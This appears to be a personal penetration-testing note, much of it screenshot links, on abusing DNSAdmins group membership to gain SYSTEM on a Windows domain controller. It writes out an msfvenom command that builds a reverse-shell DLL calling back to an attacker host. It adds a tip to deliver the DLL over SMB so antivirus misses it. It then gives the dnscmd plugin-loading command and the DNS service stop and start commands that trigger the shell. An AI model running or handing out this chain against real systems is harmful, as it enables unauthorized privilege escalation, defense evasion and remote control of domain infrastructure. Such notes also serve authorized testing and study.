[https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2)
- this guide is really good
  
first check that the user is part of the DNSAdmins group
![image 404.png](../../assets/DNSAdmins/image%20404.png)
  
craft a dll payload for the dnscmd.exe
- msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=ATTACKER<PORT>-f dll > privesc.dll
  
if you’re using evil-winrm, the dll will get picked up by AV, so use smb instead
![image 1 301.png](../../assets/DNSAdmins/image%201%20301.png)
  
set up a listener on the port specified in the dll
![image 2 255.png](../../assets/DNSAdmins/image%202%20255.png)
  
next inject the dll into the dnscmd.exe
![image 3 217.png](../../assets/DNSAdmins/image%203%20217.png)
- cmd /c dnscmd localhost /config /serverlevelplugindll \\<IP>\<share>\privesc.dll
  
next stop the DNS server
- cmd /c sc.exe stop dns
![image 4 188.png](../../assets/DNSAdmins/image%204%20188.png)
then start the DNS server again
- cmd /c sc.exe start dns
![image 5 174.png](../../assets/DNSAdmins/image%205%20174.png)
  
if it’s successful, you should see some activity on the smb share
![image 6 149.png](../../assets/DNSAdmins/image%206%20149.png)
  
should pop the shell too (NT\Authority)
![image 7 138.png](../../assets/DNSAdmins/image%207%20138.png)